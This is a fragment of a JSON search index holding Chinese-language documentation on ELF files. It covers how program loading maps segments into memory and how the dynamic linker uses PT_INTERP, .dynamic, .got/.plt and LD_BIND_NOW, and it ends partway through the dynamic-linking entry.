            "text": "\u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2aelf\u6587\u4ef6\u6bd4\u8f83\u7ecf\u5178\u7684\u4f8b\u5b50\u3002   \u6709\u65f6\u95f4\u4f1a\u7ed3\u5408\u5177\u4f53\u7684\u7a0b\u5e8f\uff0c\u7ed9\u51fa\u4e00\u4e2a\u66f4\u597d\u7684\u4f8b\u5b50\u3002", 
            "title": "\u4f8b\u5b50"
        }, 
        {
            "location": "/executable/elf/elf_structure/#_20", 
            "text": "https://blogs.oracle.com/ali/gnu-hash-elf-sections  https://bbs.pediy.com/thread-204642.htm", 
            "title": "\u53c2\u8003\u6587\u732e"
        }, 
        {
            "location": "/executable/elf/program_loading/", 
            "text": "\u52a0\u8f7d\n\n\n\u7a0b\u5e8f\u52a0\u8f7d\u8fc7\u7a0b\u5176\u5b9e\u5c31\u662f\u7cfb\u7edf\u521b\u5efa\u6216\u8005\u6216\u8005\u6269\u5145\u8fdb\u7a0b\u955c\u7684\u8fc7\u7a0b\u3002\u5b83\u53ea\u662f\u6309\u7167\u4e00\u5b9a\u7684\u89c4\u5219\u628a\u6587\u4ef6\u7684\u6bb5\u62f7\u8d1d\u5230\u865a\u62df\u5185\u5b58\u6bb5\u4e2d\u3002\u8fdb\u7a0b\u53ea\u6709\u5728\u6267\u884c\u7684\u8fc7\u7a0b\u4e2d\u4f7f\u7528\u4e86\u5bf9\u5e94\u7684\u903b\u8f91\u9875\u9762\u65f6\uff0c\u624d\u4f1a\u7533\u8bf7\u76f8\u5e94\u7684\u7269\u7406\u9875\u9762\u3002\u901a\u5e38\u6765\u8bf4\uff0c\u4e00\u4e2a\u8fdb\u7a0b\u4e2d\u6709\u5f88\u591a\u9875\u662f\u6ca1\u6709\u88ab\u5f15\u7528\u7684\u3002\u56e0\u6b64\uff0c\u5ef6\u8fdf\u7269\u7406\u8bfb\u5199\u53ef\u4ee5\u63d0\u9ad8\u7cfb\u7edf\u7684\u6027\u80fd\u3002\u4e3a\u4e86\u8fbe\u5230\u8fd9\u6837\u7684\u6548\u7387\uff0c\u53ef\u6267\u884c\u6587\u4ef6\u4ee5\u53ca\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u6240\u62e5\u6709\u7684\u6bb5\u7684\u6587\u4ef6\u504f\u79fb\u4ee5\u53ca\u865a\u62df\u5730\u5740\u5fc5\u987b\u662f\u5408\u9002\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\u4ed6\u4eec\u5fc5\u987b\u662f\u9875\u5927\u5c0f\u7684\u6574\u6570\u500d\u3002\n\n\n\u5728Intel\u67b6\u6784\u4e2d\uff0c\u865a\u62df\u5730\u5740\u4ee5\u53ca\u6587\u4ef6\u504f\u79fb\u5fc5\u987b\u662f4KB\u7684\u6574\u6570\uff0c\u6216\u8005\u8bf4\u662f\u66f4\u5927\u76842\u7684\u6574\u6570\u500d\u3002\n\n\n\u4e0b\u9762\u662f\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\u5e03\u5c40\u7684\u4f8b\u5b50\n\n\n\n\n\u5bf9\u5e94\u7684\u4ee3\u7801\u6bb5\u4ee5\u53ca\u6570\u636e\u6bb5\u7684\u89e3\u91ca\u5982\u4e0b\n\n\n \n\n\n\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u5c3d\u7ba1\u4ee3\u7801\u6bb5\u548c\u6570\u636e\u6bb5\u5728\u6a214KB\u7684\u610f\u4e49\u4e0b\u76f8\u7b49\uff0c\u4f46\u662f\u4ecd\u7136\u6700\u591a\u67094\u4e2a\u9875\u9762\u5305\u542b\u6709\u4e0d\u7eaf\u7684\u4ee3\u7801\u6216\u8005\u6570\u636e\u3002\u5f53\u7136\uff0c\u5b9e\u9645\u4e2d\u4f1a\u53d6\u51b3\u4e8e\u9875\u5927\u5c0f\u6216\u8005\u6587\u4ef6\u7cfb\u7edf\u7684\u5757\u5927\u5c0f\u3002\n\n\n\n\n\u4ee3\u7801\u6bb5\u7684\u7b2c\u4e00\u4e2a\u9875\u5305\u542b\u4e86ELF\u5934\uff0c\u7a0b\u5e8f\u5934\u90e8\u8868\uff0c\u4ee5\u53ca\u5176\u4ed6\u4fe1\u606f\u3002\n\n\n\u4ee3\u7801\u6bb5\u7684\u6700\u540e\u4e00\u9875\u5305\u542b\u4e86\u6570\u636e\u6bb5\u5f00\u59cb\u90e8\u5206\u7684\u526f\u672c\u3002\n\n\n\u6570\u636e\u6bb5\u7684\u6700\u540e\u4e00\u9875\u5305\u542b\u4e86\u4ee3\u7801\u6bb5\u7684\u6700\u540e\u90e8\u5206\u7684\u526f\u672c\u3002\u81f3\u4e8e\u591a\u5c11\uff0c\u6682\u672a\u8bf4\u660e\u3002\n\n\n\u6570\u636e\u6bb5\u7684\u6700\u540e\u4e00\u90e8\u5206\u53ef\u80fd\u4f1a\u5305\u542b\u4e0e\u7a0b\u5e8f\u8fd0\u884c\u65e0\u5173\u7684\u4fe1\u606f\u3002\n\n\n\n\n\u903b\u8f91\u4e0a\u8bf4\uff0c\u7cfb\u7edf\u4f1a\u5bf9\u5f3a\u5236\u63a7\u5236\u5185\u5b58\u7684\u6743\u9650\uff0c\u5c31\u597d\u6bd4\u6bcf\u4e00\u4e2a\u6bb5\u7684\u6743\u9650\u90fd\u662f\u5b8c\u5168\u72ec\u7acb\u7684\uff1b\u6bb5\u7684\u5730\u5740\u4f1a\u88ab\u8c03\u6574\uff0c\u4ee5\u4fbf\u4e8e\u786e\u4fdd\u5185\u5b58\u4e2d\u7684\u6bcf\u4e00\u4e2a\u903b\u8f91\u9875\u90fd\u53ea\u6709\u4e00\u7ec4\u7c7b\u578b\u7684\u6743\u9650\u3002\u5728\u4e0a\u9762\u7ed9\u51fa\u7684\u4f8b\u5b50\u4e2d\uff0c\u6587\u4ef6\u7684\u4ee3\u7801\u6bb5\u7684\u6700\u540e\u4e00\u90e8\u5206\u548c\u6570\u636e\u6bb5\u7684\u5f00\u59cb\u90e8\u5206\u90fd\u4f1a\u88ab\u6620\u5c04\u4e24\u6b21\uff1a\u5206\u522b\u5728\u6570\u636e\u6bb5\u7684\u865a\u62df\u5730\u5740\u4ee5\u53ca\u4ee3\u7801\u6bb5\u7684\u865a\u62df\u5730\u5740\u3002\n\n\n\u6570\u636e\u6bb5\u7684\u7ed3\u5c3e\u9700\u8981\u597d\u597d\u5904\u7406\u6ca1\u6709\u88ab\u521d\u59cb\u5316\u7684\u6570\u636e\uff0c\u4e00\u822c\u6765\u8bf4\uff0c\u7cfb\u7edf\u8981\u6c42\u5b83\u4eec\u4ee50\u5f00\u59cb\u3002\u56e0\u6b64\uff0c\u5982\u679c\u4e00\u4e2a\u6587\u4ef6\u7684\u6700\u540e\u4e00\u9875\u5305\u542b\u4e0d\u5728\u903b\u8f91\u9875\u4e2d\u7684\u4fe1\u606f\uff0c\u90a3\u4e48\u5269\u4e0b\u7684\u6570\u636e\u5fc5\u987b\u88ab\u521d\u59cb\u5316\u4e3a0\u3002\u5269\u4e0b\u7684\u4e09\u4e2a\u9875\u4e2d\u7684\u6742\u8d28\u6570\u636e\u5728\u903b\u8f91\u4e0a\u8bf4\u5e76\u4e0d\u662f\u8fdb\u7a0b\u955c\u50cf\u7684\u4e00\u90e8\u5206\uff0c\u7cfb\u7edf\u53ef\u4ee5\u9009\u62e9\u5220\u9664\u5b83\u4eec\u3002\u8be5\u6587\u4ef6\u5bf9\u5e94\u7684\u865a\u62df\u5185\u5b58\u955c\u50cf\u5982\u4e0b\uff08\u5047\u8bbe\u6bcf\u4e00\u9875\u5927\u5c0f\u4e3a4KB\uff09\n\n\n\n\n\u5728\u52a0\u8f7d\u6bb5\u65f6\uff0c\u53ef\u6267\u884c\u6587\u4ef6\u4e0e\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u6709\u6240\u533a\u522b\u3002\u53ef\u6267\u884c\u6587\u4ef6\u901a\u5e38\u6765\u8bf4\u5305\u542b\u7edd\u5bf9\u4ee3\u7801\u3002\u4e3a\u4e86\u80fd\u591f\u4f7f\u5f97\u7a0b\u5e8f\u6b63\u786e\u6267\u884c\uff0c\u6bcf\u4e00\u4e2a\u6bb5\u5e94\u8be5\u5728\u7528\u4e8e\u6784\u5efa\u53ef\u6267\u884c\u6587\u4ef6\u7684\u865a\u62df\u5730\u5740\u5904\u3002\u56e0\u6b64\uff0c\u7cfb\u7edf\u76f4\u63a5\u4f7f\u7528p_vaddr\u4f5c\u4e3a\u865a\u62df\u5730\u5740\u3002\n\n\n\u53e6\u4e00\u65b9\u9762\uff0c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u901a\u5e38\u5305\u542b\u5730\u5740\u72ec\u7acb\u4ee3\u7801\u3002\u8fd9\u4f7f\u5f97\u5728\u4e0d\u540c\u7684\u8fdb\u7a0b\u4e2d\uff0c\u540c\u4e00\u6bb5\u7684\u865a\u62df\u5730\u5740\u53ef\u80fd\u4f1a\u6709\u6240\u4e0d\u540c\uff0c\u4f46\u8fd9\u5e76\u4e0d\u4f1a\u5f71\u54cd\u7a0b\u5e8f\u7684\u6267\u884c\u884c\u4e3a\u3002\u5c3d\u7ba1\u7cfb\u7edf\u4f1a\u4e3a\u4e0d\u540c\u7684\u8fdb\u7a0b\u9009\u62e9\u4e0d\u540c\u7684\u865a\u62df\u5730\u5740\uff0c\u4f46\u662f\u5b83\u4ecd\u65e7\u7ef4\u6301\u4e86\u6bb5\u7684\u76f8\u5bf9\u5730\u5740\u3002\u56e0\u4e3a\u5730\u5740\u72ec\u7acb\u4ee3\u7801\u5728\u4e0d\u540c\u7684\u6bb5\u4e2d\u4f7f\u7528\u76f8\u5bf9\u5730\u5740\uff0c\u56e0\u6b64\u5728\u865a\u62df\u5185\u5b58\u4e2d\u7684\u865a\u62df\u5730\u5740\u4e4b\u95f4\u7684\u5dee\u80af\u5b9a\u548c\u5728\u6587\u4ef6\u4e2d\u7684\u76f8\u5e94\u7684\u865a\u62df\u5730\u5740\u7684\u5dee\u76f8\u540c\u3002\u4e0b\u9762\u7ed9\u51fa\u4e86\u53ef\u80fd\u7684\u5bf9\u4e8e\u540c\u4e00\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e0d\u540c\u8fdb\u7a0b\u7684\u60c5\u51b5\uff0c\u63cf\u8ff0\u4e86\u76f8\u5bf9\u5730\u5740\u5bfb\u5740\uff0c\u6b64\u5916\u8fd9\u4e2a\u8868\u8fd8\u7ed9\u51fa\u4e86\u57fa\u5730\u5740\u7684\u8ba1\u7b97\u65b9\u6cd5\u3002", 
            "title": "\u7a0b\u5e8f\u52a0\u8f7d"
        }, 
        {
            "location": "/executable/elf/program_loading/#_1", 
            "text": "\u7a0b\u5e8f\u52a0\u8f7d\u8fc7\u7a0b\u5176\u5b9e\u5c31\u662f\u7cfb\u7edf\u521b\u5efa\u6216\u8005\u6216\u8005\u6269\u5145\u8fdb\u7a0b\u955c\u7684\u8fc7\u7a0b\u3002\u5b83\u53ea\u662f\u6309\u7167\u4e00\u5b9a\u7684\u89c4\u5219\u628a\u6587\u4ef6\u7684\u6bb5\u62f7\u8d1d\u5230\u865a\u62df\u5185\u5b58\u6bb5\u4e2d\u3002\u8fdb\u7a0b\u53ea\u6709\u5728\u6267\u884c\u7684\u8fc7\u7a0b\u4e2d\u4f7f\u7528\u4e86\u5bf9\u5e94\u7684\u903b\u8f91\u9875\u9762\u65f6\uff0c\u624d\u4f1a\u7533\u8bf7\u76f8\u5e94\u7684\u7269\u7406\u9875\u9762\u3002\u901a\u5e38\u6765\u8bf4\uff0c\u4e00\u4e2a\u8fdb\u7a0b\u4e2d\u6709\u5f88\u591a\u9875\u662f\u6ca1\u6709\u88ab\u5f15\u7528\u7684\u3002\u56e0\u6b64\uff0c\u5ef6\u8fdf\u7269\u7406\u8bfb\u5199\u53ef\u4ee5\u63d0\u9ad8\u7cfb\u7edf\u7684\u6027\u80fd\u3002\u4e3a\u4e86\u8fbe\u5230\u8fd9\u6837\u7684\u6548\u7387\uff0c\u53ef\u6267\u884c\u6587\u4ef6\u4ee5\u53ca\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u6240\u62e5\u6709\u7684\u6bb5\u7684\u6587\u4ef6\u504f\u79fb\u4ee5\u53ca\u865a\u62df\u5730\u5740\u5fc5\u987b\u662f\u5408\u9002\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\u4ed6\u4eec\u5fc5\u987b\u662f\u9875\u5927\u5c0f\u7684\u6574\u6570\u500d\u3002  \u5728Intel\u67b6\u6784\u4e2d\uff0c\u865a\u62df\u5730\u5740\u4ee5\u53ca\u6587\u4ef6\u504f\u79fb\u5fc5\u987b\u662f4KB\u7684\u6574\u6570\uff0c\u6216\u8005\u8bf4\u662f\u66f4\u5927\u76842\u7684\u6574\u6570\u500d\u3002  \u4e0b\u9762\u662f\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\u5e03\u5c40\u7684\u4f8b\u5b50   \u5bf9\u5e94\u7684\u4ee3\u7801\u6bb5\u4ee5\u53ca\u6570\u636e\u6bb5\u7684\u89e3\u91ca\u5982\u4e0b     \u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u5c3d\u7ba1\u4ee3\u7801\u6bb5\u548c\u6570\u636e\u6bb5\u5728\u6a214KB\u7684\u610f\u4e49\u4e0b\u76f8\u7b49\uff0c\u4f46\u662f\u4ecd\u7136\u6700\u591a\u67094\u4e2a\u9875\u9762\u5305\u542b\u6709\u4e0d\u7eaf\u7684\u4ee3\u7801\u6216\u8005\u6570\u636e\u3002\u5f53\u7136\uff0c\u5b9e\u9645\u4e2d\u4f1a\u53d6\u51b3\u4e8e\u9875\u5927\u5c0f\u6216\u8005\u6587\u4ef6\u7cfb\u7edf\u7684\u5757\u5927\u5c0f\u3002   \u4ee3\u7801\u6bb5\u7684\u7b2c\u4e00\u4e2a\u9875\u5305\u542b\u4e86ELF\u5934\uff0c\u7a0b\u5e8f\u5934\u90e8\u8868\uff0c\u4ee5\u53ca\u5176\u4ed6\u4fe1\u606f\u3002  \u4ee3\u7801\u6bb5\u7684\u6700\u540e\u4e00\u9875\u5305\u542b\u4e86\u6570\u636e\u6bb5\u5f00\u59cb\u90e8\u5206\u7684\u526f\u672c\u3002  \u6570\u636e\u6bb5\u7684\u6700\u540e\u4e00\u9875\u5305\u542b\u4e86\u4ee3\u7801\u6bb5\u7684\u6700\u540e\u90e8\u5206\u7684\u526f\u672c\u3002\u81f3\u4e8e\u591a\u5c11\uff0c\u6682\u672a\u8bf4\u660e\u3002  \u6570\u636e\u6bb5\u7684\u6700\u540e\u4e00\u90e8\u5206\u53ef\u80fd\u4f1a\u5305\u542b\u4e0e\u7a0b\u5e8f\u8fd0\u884c\u65e0\u5173\u7684\u4fe1\u606f\u3002   \u903b\u8f91\u4e0a\u8bf4\uff0c\u7cfb\u7edf\u4f1a\u5bf9\u5f3a\u5236\u63a7\u5236\u5185\u5b58\u7684\u6743\u9650\uff0c\u5c31\u597d\u6bd4\u6bcf\u4e00\u4e2a\u6bb5\u7684\u6743\u9650\u90fd\u662f\u5b8c\u5168\u72ec\u7acb\u7684\uff1b\u6bb5\u7684\u5730\u5740\u4f1a\u88ab\u8c03\u6574\uff0c\u4ee5\u4fbf\u4e8e\u786e\u4fdd\u5185\u5b58\u4e2d\u7684\u6bcf\u4e00\u4e2a\u903b\u8f91\u9875\u90fd\u53ea\u6709\u4e00\u7ec4\u7c7b\u578b\u7684\u6743\u9650\u3002\u5728\u4e0a\u9762\u7ed9\u51fa\u7684\u4f8b\u5b50\u4e2d\uff0c\u6587\u4ef6\u7684\u4ee3\u7801\u6bb5\u7684\u6700\u540e\u4e00\u90e8\u5206\u548c\u6570\u636e\u6bb5\u7684\u5f00\u59cb\u90e8\u5206\u90fd\u4f1a\u88ab\u6620\u5c04\u4e24\u6b21\uff1a\u5206\u522b\u5728\u6570\u636e\u6bb5\u7684\u865a\u62df\u5730\u5740\u4ee5\u53ca\u4ee3\u7801\u6bb5\u7684\u865a\u62df\u5730\u5740\u3002  \u6570\u636e\u6bb5\u7684\u7ed3\u5c3e\u9700\u8981\u597d\u597d\u5904\u7406\u6ca1\u6709\u88ab\u521d\u59cb\u5316\u7684\u6570\u636e\uff0c\u4e00\u822c\u6765\u8bf4\uff0c\u7cfb\u7edf\u8981\u6c42\u5b83\u4eec\u4ee50\u5f00\u59cb\u3002\u56e0\u6b64\uff0c\u5982\u679c\u4e00\u4e2a\u6587\u4ef6\u7684\u6700\u540e\u4e00\u9875\u5305\u542b\u4e0d\u5728\u903b\u8f91\u9875\u4e2d\u7684\u4fe1\u606f\uff0c\u90a3\u4e48\u5269\u4e0b\u7684\u6570\u636e\u5fc5\u987b\u88ab\u521d\u59cb\u5316\u4e3a0\u3002\u5269\u4e0b\u7684\u4e09\u4e2a\u9875\u4e2d\u7684\u6742\u8d28\u6570\u636e\u5728\u903b\u8f91\u4e0a\u8bf4\u5e76\u4e0d\u662f\u8fdb\u7a0b\u955c\u50cf\u7684\u4e00\u90e8\u5206\uff0c\u7cfb\u7edf\u53ef\u4ee5\u9009\u62e9\u5220\u9664\u5b83\u4eec\u3002\u8be5\u6587\u4ef6\u5bf9\u5e94\u7684\u865a\u62df\u5185\u5b58\u955c\u50cf\u5982\u4e0b\uff08\u5047\u8bbe\u6bcf\u4e00\u9875\u5927\u5c0f\u4e3a4KB\uff09   \u5728\u52a0\u8f7d\u6bb5\u65f6\uff0c\u53ef\u6267\u884c\u6587\u4ef6\u4e0e\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u6709\u6240\u533a\u522b\u3002\u53ef\u6267\u884c\u6587\u4ef6\u901a\u5e38\u6765\u8bf4\u5305\u542b\u7edd\u5bf9\u4ee3\u7801\u3002\u4e3a\u4e86\u80fd\u591f\u4f7f\u5f97\u7a0b\u5e8f\u6b63\u786e\u6267\u884c\uff0c\u6bcf\u4e00\u4e2a\u6bb5\u5e94\u8be5\u5728\u7528\u4e8e\u6784\u5efa\u53ef\u6267\u884c\u6587\u4ef6\u7684\u865a\u62df\u5730\u5740\u5904\u3002\u56e0\u6b64\uff0c\u7cfb\u7edf\u76f4\u63a5\u4f7f\u7528p_vaddr\u4f5c\u4e3a\u865a\u62df\u5730\u5740\u3002  \u53e6\u4e00\u65b9\u9762\uff0c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u901a\u5e38\u5305\u542b\u5730\u5740\u72ec\u7acb\u4ee3\u7801\u3002\u8fd9\u4f7f\u5f97\u5728\u4e0d\u540c\u7684\u8fdb\u7a0b\u4e2d\uff0c\u540c\u4e00\u6bb5\u7684\u865a\u62df\u5730\u5740\u53ef\u80fd\u4f1a\u6709\u6240\u4e0d\u540c\uff0c\u4f46\u8fd9\u5e76\u4e0d\u4f1a\u5f71\u54cd\u7a0b\u5e8f\u7684\u6267\u884c\u884c\u4e3a\u3002\u5c3d\u7ba1\u7cfb\u7edf\u4f1a\u4e3a\u4e0d\u540c\u7684\u8fdb\u7a0b\u9009\u62e9\u4e0d\u540c\u7684\u865a\u62df\u5730\u5740\uff0c\u4f46\u662f\u5b83\u4ecd\u65e7\u7ef4\u6301\u4e86\u6bb5\u7684\u76f8\u5bf9\u5730\u5740\u3002\u56e0\u4e3a\u5730\u5740\u72ec\u7acb\u4ee3\u7801\u5728\u4e0d\u540c\u7684\u6bb5\u4e2d\u4f7f\u7528\u76f8\u5bf9\u5730\u5740\uff0c\u56e0\u6b64\u5728\u865a\u62df\u5185\u5b58\u4e2d\u7684\u865a\u62df\u5730\u5740\u4e4b\u95f4\u7684\u5dee\u80af\u5b9a\u548c\u5728\u6587\u4ef6\u4e2d\u7684\u76f8\u5e94\u7684\u865a\u62df\u5730\u5740\u7684\u5dee\u76f8\u540c\u3002\u4e0b\u9762\u7ed9\u51fa\u4e86\u53ef\u80fd\u7684\u5bf9\u4e8e\u540c\u4e00\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e0d\u540c\u8fdb\u7a0b\u7684\u60c5\u51b5\uff0c\u63cf\u8ff0\u4e86\u76f8\u5bf9\u5730\u5740\u5bfb\u5740\uff0c\u6b64\u5916\u8fd9\u4e2a\u8868\u8fd8\u7ed9\u51fa\u4e86\u57fa\u5730\u5740\u7684\u8ba1\u7b97\u65b9\u6cd5\u3002", 
            "title": "\u52a0\u8f7d"
        }, 
        {
            "location": "/executable/elf/program_linking/", 
            "text": "\u7a0b\u5e8f\u94fe\u63a5\n\n\n\u9759\u6001\u94fe\u63a5\n\n\n\u52a8\u6001\u94fe\u63a5\n\n\n\u52a8\u6001\u94fe\u63a5\u4e3b\u8981\u662f\u5728\u7a0b\u5e8f\u521d\u59cb\u5316\u65f6\u6216\u8005\u7a0b\u5e8f\u6267\u884c\u7684\u8fc7\u7a0b\u4e2d\u89e3\u6790\u53d8\u91cf\u6216\u8005\u51fd\u6570\u7684\u5f15\u7528\u3002ELF\u6587\u4ef6\u4e2d\u67d0\u4e9b\u8282\u533a\u4ee5\u53ca\u5934\u90e8\u5143\u7d20\u5c31\u4e0e\u52a8\u6001\u94fe\u63a5\u6709\u5173\u3002\u52a8\u6001\u94fe\u63a5\u7684\u6a21\u578b\u7531\u64cd\u4f5c\u7cfb\u7edf\u5b9a\u4e49\u5e76\u5b9e\u73b0\u3002\n\n\nDynamic Linker\n\n\n\u52a8\u6001\u94fe\u63a5\u5668\u53ef\u4ee5\u7528\u6765\u5e2e\u52a9\u52a0\u8f7d\u5e94\u7528\u6240\u9700\u8981\u7684\u5e93\u5e76\u89e3\u6790\u5e93\u6240\u5bfc\u51fa\u7684\u52a8\u6001\u7b26\u53f7\uff08\u51fd\u6570\u548c\u5168\u5c40\u53d8\u91cf\uff09\u3002\n\n\n\u5f53\u4f7f\u7528\u52a8\u6001\u94fe\u63a5\u6765\u6784\u9020\u7a0b\u5e8f\u65f6\uff0c\u94fe\u63a5\u7f16\u8f91\u5668\u4f1a\u5728\u53ef\u6267\u884c\u6587\u4ef6\u7684\u7a0b\u5e8f\u5934\u90e8\u6dfb\u52a0\u4e00\u4e2a PT_INTERP \u7c7b\u578b\u7684\u5143\u7d20\uff0c\u4ee5\u4fbf\u4e8e\u544a\u8bc9\u7cfb\u7edf\u5c06\u52a8\u6001\u94fe\u63a5\u5668\u4f5c\u4e3a\u7a0b\u5e8f\u89e3\u91ca\u5668\u6765\u8c03\u7528\u3002\n\n\n\n\n\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5bf9\u4e8e\u7cfb\u7edf\u63d0\u4f9b\u7684\u52a8\u6001\u94fe\u63a5\u5668\uff0c\u4e0d\u540c\u7684\u7cfb\u7edf\u4f1a\u4e0d\u540c\u3002\n\n\n\n\n\u53ef\u6267\u884c\u7a0b\u5e8f\u548c\u52a8\u6001\u94fe\u63a5\u5668\u4f1a\u5408\u4f5c\u8d77\u6765\u4e3a\u7a0b\u5e8f\u521b\u5efa\u8fdb\u7a0b\u955c\u50cf\uff0c\u5177\u4f53\u7684\u7ec6\u8282\u5982\u4e0b\uff1a\n\n\n\n\n\u5c06\u53ef\u6267\u884c\u6587\u4ef6\u7684\u5185\u5b58\u6bb5\u6dfb\u52a0\u5230\u8fdb\u7a0b\u955c\u50cf\u4e2d\u3002\n\n\n\u5c06\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u7684\u5185\u5b58\u6bb5\u6dfb\u52a0\u5230\u8fdb\u7a0b\u955c\u50cf\u4e2d\u3002\n\n\n\u4e3a\u53ef\u6267\u884c\u6587\u4ef6\u4ee5\u53ca\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u8fdb\u884c\u91cd\u5b9a\u4f4d\u3002\n\n\n\u5982\u679c\u4f20\u9012\u7ed9\u4e86\u52a8\u6001\u94fe\u63a5\u5668\u4e00\u4e2a\u6587\u4ef6\u63cf\u8ff0\u7b26\u7684\u8bdd\uff0c\u5c31\u5c06\u5176\u5173\u95ed\u3002\n\n\n\u5c06\u63a7\u5236\u6743\u4f20\u9012\u7ed9\u7a0b\u5e8f\u3002\u8fd9\u8ba9\u6211\u4eec\u611f\u89c9\u8d77\u6765\u5c31\u597d\u50cf\u7a0b\u5e8f\u76f4\u63a5\u4ece\u53ef\u6267\u884c\u6587\u4ef6\u5904\u62ff\u5230\u4e86\u6267\u884c\u6743\u9650\u3002\n\n\n\n\n\u94fe\u63a5\u7f16\u8f91\u5668\u540c\u6837\u4e5f\u521b\u5efa\u4e86\u5404\u79cd\u5404\u6837\u7684\u6570\u636e\u6765\u534f\u52a9\u52a8\u6001\u94fe\u63a5\u5668\u6765\u5904\u7406\u53ef\u6267\u884c\u6587\u4ef6\u548c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\uff0c\u4f8b\u5982\n\n\n\n\n\u7c7b\u578b\u4e3aSHT_DYNAMIC\u7684\u8282.dynamic\u5305\u542b\u4e86\u5404\u79cd\u5404\u6837\u7684\u6570\u636e\uff0c\u5728\u8fd9\u4e2a\u8282\u7684\u5f00\u59cb\u5904\u5305\u542b\u4e86\u5176\u5b83\u52a8\u6001\u94fe\u63a5\u7684\u4fe1\u606f\u3002\n\n\n\u7c7b\u578b\u4e3aSHT_HASH\u7684\u8282.hash\u5305\u542b\u4e86\u7b26\u53f7\u54c8\u5e0c\u8868\u3002\n\n\n\u7c7b\u578b\u4e3aSHT_PROGBITS\u7684\u8282.got\u4ee5\u53ca.plt\u5305\u542b\u4e86\u4e24\u4e2a\u72ec\u7acb\u7684\u8868\uff1a\u5168\u5c40\u504f\u79fb\u8868\uff0c\u8fc7\u7a0b\u94fe\u63a5\u8868\u3002\u7a0b\u5e8f\u4f1a\u5229\u7528\u8fc7\u7a0b\u94fe\u63a5\u8868\u6765\u5904\u7406\u5730\u5740\u72ec\u7acb\u4ee3\u7801\u3002\n\n\n\n\n\u56e0\u4e3a\u6240\u6709\u7684UNIX System V\u90fd\u4f1a\u4ece\u4e00\u4e2a\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e2d\u5bfc\u5165\u57fa\u672c\u7684\u7cfb\u7edf\u670d\u52a1\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u4f1a\u53c2\u4e0e\u5230\u6bcf\u4e00\u4e2aTIS ELF-conforming\u7684\u7a0b\u5e8f\u6267\u884c\u8fc7\u7a0b\u4e2d\u3002\n\n\n\u6b63\u5982\u7a0b\u5e8f\u52a0\u8f7d\u4e2d\u6240\u8bf4\u7684\uff0c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e2d\u53ef\u80fd\u4f1a\u5360\u7528\u4e0e\u7a0b\u5e8f\u5934\u90e8\u4e2d\u8bb0\u5f55\u7684\u4e0d\u4e00\u6837\u7684\u865a\u62df\u5730\u5740\u3002\u52a8\u6001\u94fe\u63a5\u5668\u4f1a\u5728\u7a0b\u5e8f\u62ff\u5230\u63a7\u5236\u6743\u524d\uff0c\u91cd\u5b9a\u4f4d\u5185\u5b58\u955c\u50cf\uff0c\u66f4\u65b0\u7edd\u5bf9\u5730\u5740\u3002\u5982\u679c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u786e\u5b9e\u52a0\u8f7d\u5230\u4e86\u5176\u5728\u7a0b\u5e8f\u5934\u90e8\u4e2d\u6307\u5b9a\u7684\u5730\u5740\u7684\u8bdd\uff0c\u90a3\u4e48\u90a3\u4e9b\u7edd\u5bf9\u5730\u5740\u7684\u503c\u5c31\u4f1a\u662f\u6b63\u786e\u7684\u3002\u4f46\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u8fd9\u79cd\u60c5\u51b5\u4e0d\u4f1a\u53d1\u751f\u3002\n\n\n\u5982\u679c\u8fdb\u7a0b\u7684\u73af\u5883\u4e2d\u6709\u540d\u53eb LD_BIND_NOW \u7684\u975e\u7a7a\u503c\uff0c\u90a3\u4e48\u52a8\u6001\u8fde\u63a5\u5668\u5728\u628a\u6743\u9650\u4f20\u9012\u7ed9\u7a0b\u5e8f\u65f6\uff0c\u4f1a\u6267\u884c\u6240\u6709\u7684\u91cd\u5b9a\u4f4d\u3002\u4f8b\u5982\uff0c\u6240\u6709\u7684\u5982\u4e0b\u73af\u5883\u53d8\u91cf\u7684\u53d6\u503c\u90fd\u4f1a\u6307\u5b9a\u8fd9\u4e00\u884c\u4e3a\u3002\n\n\n\n\nLD_BIND_NOW = 1\n\n\nLD_BIND_NOW = on\n\n\nLD_BIND_NOW = off\n\n\n\n\n\u5426\u5219\uff0cLD_BIND_NOW \u8981\u4e48\u4e0d\u5b58\u5728\u4e8e\u5f53\u524d\u7684\u8fdb\u7a0b\u73af\u5883\u4e2d\uff0c\u8981\u4e48\u5177\u6709\u4e00\u4e2a\u975e\u7a7a\u503c\u3002\u52a8\u6001\u94fe\u63a5\u5668\u53ef\u4ee5\u5ef6\u8fdf\u89e3\u6790\u8fc7\u7a0b\u94fe\u63a5\u8868\u7684\u5165\u53e3\uff0c\u8fd9\u5176\u5b9e\u5c31\u662fplt\u8868\u7684\u5ef6\u8fdf\u7ed1\u5b9a\uff0c\u5373\u5f53\u7a0b\u5e8f\u9700\u8981\u4f7f\u7528\u67d0\u4e2a\u7b26\u53f7\u65f6\uff0c\u518d\u8fdb\u884c\u5730\u5740\u89e3\u6790\uff0c\u8fd9\u53ef\u4ee5\u51cf\u5c11\u7b26\u53f7\u89e3\u6790\u4ee5\u53ca\u91cd\u5b9a\u4f4d\u7684\u8d1f\u8f7d\u3002\n\n\nFunction 